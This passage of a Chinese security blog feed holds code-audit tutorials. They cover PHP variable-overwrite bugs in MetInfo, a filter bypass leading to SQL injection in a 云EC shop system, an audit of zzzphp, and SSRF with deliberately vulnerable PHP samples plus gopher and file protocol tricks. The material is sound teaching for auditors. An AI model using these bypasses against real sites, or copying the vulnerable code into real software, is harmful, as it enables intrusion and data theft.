        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文章来自 公众号：404安全</p><p>变量覆盖，顾名思义就是可以覆盖已有变量值，导致变量覆盖的漏洞有：<code>extract()</code>、<code>parse_str()</code>、<code>import_request_variables()</code> 使用不当，或者使用了<code>$$</code>或者开启了全局变量注册。</p><h1 id="0x01-变量覆盖演示"><a href="#0x01-变量覆盖演示" class="headerlink" title="0x01 变量覆盖演示"></a>0x01 变量覆盖演示</h1><p><strong>extract()</strong></p><p><code>extract(array,extract_rules,prefix)</code><br>函数从数组中将变量导入到当前的符号表，即将数组中的键值对注册成函数，使用数组键名作为变量名，使用数组键值作为变量值。</p><p><img src="https://img-blog.csdnimg.cn/20200401200214722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>可以看到我们初始变量值为a但是覆盖之后就变成了我们输入的值。</p><p><strong>parse_str()</strong></p><p><code>parse_str()</code>函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。在没有array参数的情况下使用此函数，并且在PHP 7.2中将废弃不设置参数的行为,此函数没有返回值。</p><p><img src="https://img-blog.csdnimg.cn/20200401200232943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p><strong>import_request_variables()</strong></p><p><code>import_request_variables ( string $types , string $prefix )</code><br>将 GET／POST／Cookie 变量导入到全局作用域中, types 参数指定需要导入的变量, G代表GET，P代表POST，C代表COOKIE。此函数只能用于PHP4.1 ~ PHP5.4。</p><p><img src="https://img-blog.csdnimg.cn/20200401200250569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p><strong>$$</strong></p><p>典型的例子就是foreach来遍历数组中的值作为变量。</p><p><img src="https://img-blog.csdnimg.cn/20200401200307107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>其中<code>$_key</code>的值为a,那么 <code>$a</code>的值就被覆盖为2了。</p><p>还有全局注册register_globals这些，php配置默认都是关闭的。</p><h1 id="0x02-实战审计"><a href="#0x02-实战审计" class="headerlink" title="0x02 实战审计"></a>0x02 实战审计</h1><p>本次用到的是MetInfo cms的变量覆盖漏洞，跟进主页来到核心配置文件</p><p>\include\common.inc.php</p><p><img src="https://img-blog.csdnimg.cn/20200401200324653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>看到文件的24~28行，明显用到了我们上面说的&amp;&amp;变量覆盖的写法，不过这里他用到了<code>daddslashes()</code>防注入，不过并不影响我们这章讲的知识。</p><p>随便来到一个子文件看看他的加载方式\news\index.php</p><p><img src="https://img-blog.csdnimg.cn/20200401200340311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>第7行包含一个变量，那么这个变量在什么地方，我们跟进 include/module.php 看看，在本文件搜索<code>$module</code>变量。</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片<img src="https://img-blog.csdnimg.cn/20200401200615614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>这里其实低版本的源码中没有这句话<code>$module = &#39;&#39;;</code> 其中<code>$module</code>变量都在<code>$fmodule != 7</code> 这个if条件中，我给大家打包的是低版本，我安装错了。 也就是只要我们传入的<code>$fmodule</code>的值为7那么我们就可以覆盖这个<code>$module</code>的值</p><p><img src="https://img-blog.csdnimg.cn/20200401200411370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt><br>只要上传一张图片或者其他文件就可以包含了，因为<code>require_once</code>的时候并没有判断他的后缀名。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>过滤逻辑错误审计</title>
      <link href="/2020/040161007.html"/>
      <url>/2020/040161007.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文章来自 公众号：404安全</p><p>本文审计的系统为云ec电商系统版本1.2.3，网上也有审计文章这里主要是讲讲，有些程序可能本身他的过滤代码还是比较不错，但是逻辑问题造成了过滤函数没有起作用。</p><h1 id="0x01-实例审计"><a href="#0x01-实例审计" class="headerlink" title="0x01 实例审计"></a>0x01 实例审计</h1><p>还是先从index.php文件看进去吧！</p><pre><code>&lt;?phpdefine(&#39;in_mx&#39;, TRUE);$ym_version=&#39;1.2.3&#39;;$p=isset($_GET[&#39;p&#39;]) ? addslashes($_GET[&#39;p&#39;]) : &#39;&#39;;$p=(trim($p)==&#39;&#39;) ? &#39;index&#39; : trim($p);require(&quot;./inc/function/global.php&quot;);switch ($p){    case &#39;admin&#39;:        include(&quot;./inc/function/global_admin&quot;.Ext);        exit();    break;    case &#39;install&#39;:        require(&quot;./install/index&quot;.Ext);        exit();    break;    default:        if(strpos($p, &quot;n-&quot;)===0 || $ym_url_path[0] === &#39;news&#39;){            include(&quot;./inc/function/global_news&quot;.Ext);        }        else{            include(&quot;./inc/function/global_page&quot;.Ext);        }    break;}?&gt;</code></pre><p>从index.php来看是GET获取P参数然后引用对应的文件，先来看看/inc/function/global.php</p><pre><code>set_error_handler(&quot;customError&quot;,E_ERROR);$getfilter=&quot;\\b(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;$postfilter=&quot;\\b(and|or)\\b.{1,6}?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;$cookiefilter=&quot;\\b(and|or)\\b.{1,6}?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;function StopAttack($StrFiltKey,$StrFiltValue,$ArrFiltReq){      if(is_array($StrFiltValue))    {        $StrFiltValue=implode($StrFiltValue);    }            if (preg_match(&quot;/&quot;.$ArrFiltReq.&quot;/is&quot;,urldecode($StrFiltValue))){            print &quot;网址有误~&quot;;            exit();    }      }  foreach($_GET as $key=&gt;$value){    StopAttack($key,$value,$getfilter);}if ($_GET[&quot;p&quot;]!==&#39;admin&#39;){    foreach($_POST as $key=&gt;$value){         StopAttack($key,$value,$postfilter);    }}foreach($_COOKIE as $key=&gt;$value){     StopAttack($key,$value,$cookiefilter);}unset($_GET[&#39;_SESSION&#39;]);unset($_POST[&#39;_SESSION&#39;]);unset($_COOKIE[&#39;_SESSION&#39;]);</code></pre><p>这个正则貌似就是copy的360webscan的那个，这里GET、POST、COOKIE都被过滤了的，但是我们看到其中过滤POST的判断</p><pre><code>if ($_GET[&quot;p&quot;]!==&#39;admin&#39;){    foreach($_POST as $key=&gt;$value){         StopAttack($key,$value,$postfilter);    }}</code></pre><p>如果GET传入的p=admin了就不会进入这个if语句，也达到我们绕过的目的了，然后往下面看</p><pre><code>if (!empty($_GET)){ foreach($_GET AS $key =&gt; $value) $$key = addslashes_yec($value); }if (!empty($_POST)){ foreach($_POST AS $key =&gt; $value) $$key = addslashes_yec($value); }</code></pre><p>这里我们传入的P参数的值被重新覆盖掉，然后经过<code>addslashes_yec</code>函数过滤。然后我们梳理一下审计思路</p><pre><code>1. 寻找SERVER获取的。2. 寻找数字型注入，结合上面的绕过，注入密码。</code></pre><p>先看看前台注入，这个cms注入比较多，我就随便写个了</p><p>\inc\module\cart.php</p><pre><code>    elseif ($act == &#39;remove_goods&#39;) //移除商品    {                $ckey = $ckey ? intval($ckey) : intval($_COOKIE[&#39;ckey&#39;]);        $gid_list = explode(&quot;@&quot;, $gid);        $spec_list = explode(&quot;@&quot;, $spec);        $db = dbc();        $where =&#39;&#39;;        if($ckey != 0)        {            $where =&#39; and cid=&#39;.$ckey;        }        elseif($ym_uid !=0)        {            $where =&#39; and uid=&#39;.$ym_uid;        }        else {            $res[&#39;err&#39;] = &#39;请刷新页面再试&#39;;            die(json_encode_yec($res));        }        foreach ($gid_list as $k =&gt; $v) {            $sp = $spec_list[$k];            if(intval($v)&lt;=0)            {                continue;            }                        $db-&gt;query(&quot;delete i FROM &quot;.$db-&gt;table(&#39;cart&#39;).&quot; c join &quot;.$db-&gt;table(&#39;cart_item&#39;).&quot; i on c.id=i.cid where gid=&quot;.$v.&quot; and spec=&#39;&quot;.$sp.&quot;&#39; &quot;.$where);        }        $cnum = get_cart_amount(1);        $res[&#39;res&#39;] = $cnum;        $time = time() + 15552000;                        set_cookie(&#39;cnum&#39;,  $cnum, $time); //购物车数量        die(json_encode_yec($res));    }    </code></pre><p>其中传入的$gid经过<code>explode</code>函数分割（这里sql语句中不能使用@字符），然后foreach循环取出来后带入sql语句，也没有单双引号之类的包裹，比较明显的一处注入了。</p><p><img src="https://img-blog.csdnimg.cn/20200401203158965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>如果没用绕过是会触发360webscan的</p><p><img src="https://img-blog.csdnimg.cn/20200401203212735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt="\[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-34aOpFGs-1585744288016)(./img/2.1.1.png)\]"></p><h1 id="0x02-文末"><a href="#0x02-文末" class="headerlink" title="0x02 文末"></a>0x02 文末</h1><p>这套程序在1.2.4这里修复了这个逻辑方面的问题貌似漏洞就没啥了。本版本还有很多注入大家可以自己审计一下，也可以看看水泡泡巨佬的<a href="https://www.cnblogs.com/r00tuser/p/9014869.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/9014869.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>通读全文审计</title>
      <link href="/2020/040121312.html"/>
      <url>/2020/040121312.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文章来自 公众号：404安全</p><p>通读全文推荐大家开始可以审计一些比较好看懂的CMS，我们先看大体网站框架，这里你大概知道什么文件夹是放什么类型的文件，然后从<code>index.php</code>文件开始往里面读,然后重点关注是否有全局过滤等等。</p><h1 id="0x01-实例审计"><a href="#0x01-实例审计" class="headerlink" title="0x01 实例审计"></a>0x01 实例审计</h1><p>本文用到的源码是zzzphp，我们通过这个程序粗略的了解如何通读全文代码来审计，这里只做简单分析，不深入审计。</p><h2 id="了解网站框架"><a href="#了解网站框架" class="headerlink" title="了解网站框架"></a>了解网站框架</h2><pre><code>├─admin             //后台├─config            //配置文件├─form              //前台├─images            //图片├─inc               //包含文件├─install           //安装文件├─js                //js文件├─plugins           //插件├─runtime           //临时├─search            //搜索├─template          //模板├─upload            //上传文件夹└─wap               //手机</code></pre><p>首先我们看到这个结构，有一点审计基础或者会点英语应该都能看懂这些目录的意思，当然也有个别程序猿喜欢另类一点的命名规则，大体都是这样。</p><h2 id="了解网站过滤与路由"><a href="#了解网站过滤与路由" class="headerlink" title="了解网站过滤与路由"></a>了解网站过滤与路由</h2><p>我觉得全文通读不是无脑的去挨着读，这样比较浪费时间，我们一般应该先去读他的核心文件，一般都在包含文件夹里面，怎么去找核心文件一般是看文件名比如包含<code>main</code> <code>common</code>等等，也可以看看文件大小一般核心文件包含函数多文件相对较大，还可以通过入口文件一步一步去看，比如这里的核心文件就是<code>zzz_main.php</code>我们无非是先关注参数的获取、是否有全局过滤。</p><p>我们来到 <code>\inc\zzz_main.php</code></p><p><code>getlocation()</code> 解析URL</p><p><img src="https://img-blog.csdnimg.cn/20200401201932464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p><code>getform()</code>获取参数</p><p><img src="https://img-blog.csdnimg.cn/20200401201948231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>过滤函数<code>txt_html()</code> 但是通常有关过滤的函数包含一些字符<code>safe</code>之类 或者包含函数 <code>htmlspecialchars()</code> <code>addslashes()</code></p><p><img src="https://img-blog.csdnimg.cn/20200401202033385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><hr><h2 id="了解系统DB类"><a href="#了解系统DB类" class="headerlink" title="了解系统DB类"></a>了解系统DB类</h2><p>除了这个文件我们还可以看看<code>mysql</code> <code>db</code> 之类的关键词文件，看看他数据库连接的方式是否存在宽字节注入的可能，还有他的连接方式。</p><p><img src="https://img-blog.csdnimg.cn/20200401202103836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><h2 id="开始审计"><a href="#开始审计" class="headerlink" title="开始审计"></a>开始审计</h2><p>看完这些我们就可以从<code>index.php</code>一层一层读了。</p><p>来到 <code>index.php</code> 直接包含文件<code>inc/zzz_client.php</code> 先判断<code>isinstall</code> 然后执行后面</p><p><img src="https://img-blog.csdnimg.cn/20200401202122196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>看到最后一句<code>ParseGlobal(G(&#39;sid&#39;),G(&#39;cid&#39;));</code> 这里调用了<code>ParseGlobal()</code> 函数我们可以跟进去看看。</p><p>进入if分支</p><pre><code>if ( $sid &gt; 0 ) {    $data = db_load_one( &#39;sort&#39;, &#39;sid=&#39; . $sid );</code></pre><p>跟进函数<code>db_load_one()</code> 这里会把传入的&amp;替换为and</p><p><img src="https://img-blog.csdnimg.cn/20200401202854872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>跟进函数 <code>find_one()</code></p><p><img src="https://img-blog.csdnimg.cn/20200401202733577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>这里我就不详细跟了只介绍思路，基本上确定这里如果传入的参数没过滤那么这里就会存在注入。</p><p>这里跟一下 <code>G()</code> 就会发现是<code>$GLOBALS[ &#39;sid&#39; ]</code> 获取的，也就是前面解析url那里获取的值也没有过滤，那么这里基本上就是一个注入了。</p><p>读完这些文件我们就可以从各个功能文件夹的index读进去，比如这里我们来到<code>\search\index.php</code></p><pre><code>&lt;?phpdefine(&#39;LOCATION&#39;, &#39;search&#39;);require dirname(dirname(__FILE__)). &#39;/inc/zzz_client.php&#39;;</code></pre><p>还是回到刚刚我们跟进的文件 <code>/inc/zzz_client.php</code> 搜索<code>search</code>关键词然后读源码分析</p><pre><code>    case &#39;search&#39;:         $tplfile= TPL_DIR . &#39;search.html&#39;;         break;</code></pre><p>看到选中<code>Search</code>后赋值给了变量<code>$tplfile</code> 然后我们在追踪变量在那个地方被调用过</p><p><img src="https://img-blog.csdnimg.cn/20200401202913462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>发现他解析模板的过程，然后跟进<code>ParserTemplate</code> 来到<code>inc\zzz_template.php</code> 然后往下面读发现一个函数<code>getform()</code></p><p><img src="https://img-blog.csdnimg.cn/20200401203036341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p><code>getform()</code>函数获取过滤之后还被被 <code>safe_key()</code> 函数过滤，但是看到下面还有函数<code>get_cookie</code> 看样子也是获取参数的，但是这个用到函数<code>isset()</code> 他是一个检测变量的函数，定义了即为true 所以这里根本进不去，不然就是一个注入了,当然这也是一个老版本的注入，我这里的版本已经修复了。接下来还可以从<code>admin</code>的<code>index.php</code>开始读，多关注一些功能点，推荐可以搭建起来熟悉一下整套程序。</p><h1 id="0x02-文末"><a href="#0x02-文末" class="headerlink" title="0x02 文末"></a>0x02 文末</h1><p>通读这个ZZZCMS 我们可以知道，他在调用<code>getform()</code>函数的时候我们基本不考虑注入了，因为已经被过滤了，除非他后面用其他函数处理了一下。在调试复杂语句的时候我们可以通过mysql监控软件来调试。当我们发现一类函数或者写法存在漏洞的时候，可以使用全文搜索，来查找相同的代码对一类进行完整挖掘。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ssrf漏洞详解</title>
      <link href="/2020/032630644.html"/>
      <url>/2020/032630644.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-ssrf概述"><a href="#0x01-ssrf概述" class="headerlink" title="0x01. ssrf概述"></a>0x01. ssrf概述</h2><h5 id="1、SSRF漏洞概述"><a href="#1、SSRF漏洞概述" class="headerlink" title="1、SSRF漏洞概述"></a>1、SSRF漏洞概述</h5><p><code>SSRF(服务器端请求伪造)</code>： 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p><p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内网。也就是说可以利用一个网络请求的服务，当作跳板进行攻击）<br><img src="https://img-blog.csdnimg.cn/20200326134731702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt></p><h5 id="2、SSRF漏洞产生原因"><a href="#2、SSRF漏洞产生原因" class="headerlink" title="2、SSRF漏洞产生原因"></a>2、SSRF漏洞产生原因</h5><p>SSRF 形成的原因往往是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p>如：从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。利用的就是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p><h5 id="3-漏洞的产生"><a href="#3-漏洞的产生" class="headerlink" title="3.漏洞的产生"></a>3.漏洞的产生</h5><p>在PHP中的<code>curl()</code>，<code>file_get_contents()</code>，<code>fsockopen()</code> 等函数是几个主要产生ssrf漏洞的函数。</p><p><strong>1) curl()</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#curl_setopt($ch,CUPLOPT_HEADER,1);</span>    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><code>function</code> 定义一个函数，叫做curl，有一个参数，叫<code>$url</code><br><code>curl_init()</code>   初始化一个cURL会话后。将<code>$url</code>传入<code>curl_setopt($ch,CURLOPT_URL,$url);</code></p><blockquote><p><strong>（<code>curl_setopt($ch, CURLOPT_HEADER, 1)</code> 这边是设定返回信息信息，是否要返回响应信息头这里的话可以注释掉）</strong><br><img src="https://img-blog.csdnimg.cn/20200326131908813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="这是注释后"><br><img src="https://img-blog.csdnimg.cn/20200326131952608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="这是没注释的"></p></blockquote><p>然后通过 curl_exec 发起一个请求，<a href="https://www.php.cn/php-weizijiaocheng-364221.html" target="_blank" rel="noopener">curl_exec详细信息</a><br>然后这就是一个函数，接下来再设置一个get传参为变量url，然后再把这个变量url代入前面所创建的那个 curl函数</p><p><strong>2）file_get_contents()</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$content</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">'./images/'</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.img'</span><span class="token punctuation">;</span>\    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$img</span><span class="token operator">=</span><span class="token string">"&lt;img src=\""</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token string">"\"/>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token variable">$img</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>file_get_content函数从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。</p><p><strong>3) fsockopen()</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$host</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token string">"$host"</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"$errstr ($errno)&lt;br />\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string">"GET / HTTP/1.1\r\n"</span><span class="token punctuation">;</span>    <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"Host: $host\r\n"</span><span class="token punctuation">;</span>    <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"Connection: Close\r\n\r\n"</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p><code>fsockopen</code>   函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p><p><strong>注意</strong><br><strong>1.</strong> 一般情况下PHP不会开启fopen的gopher wrapper<br><strong>2.</strong> file_get_contents的gopher协议不能URL编码<br><strong>3.</strong> file_get_contents关于Gopher的302跳转会出现bug，导致利用失败<br><strong>4.</strong> curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用<br><strong>5.</strong> curl_exec() //默认不跟踪跳转，<br><strong>6.</strong> file_get_contents()  //   file_get_contents支持  php://input协议</p><p><strong>2.协议</strong><br><strong>（1）file</strong>： 在有回显的情况下，利用 file 协议可以读取任意内容<br><strong>（2）dict</strong>：泄露安装软件版本信息，查看端口，操作内网redis服务等<br><strong>（3）gopher</strong>：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell<br>（<strong>4）http/s</strong>：探测内网主机存活</p><h2 id="0x02-一些ssrf利用文章"><a href="#0x02-一些ssrf利用文章" class="headerlink" title="0x02.一些ssrf利用文章"></a>0x02.一些ssrf利用文章</h2><p><strong>1.</strong><a href="https://www.xd10086.com/posts/1516523858457311553/" target="_blank" 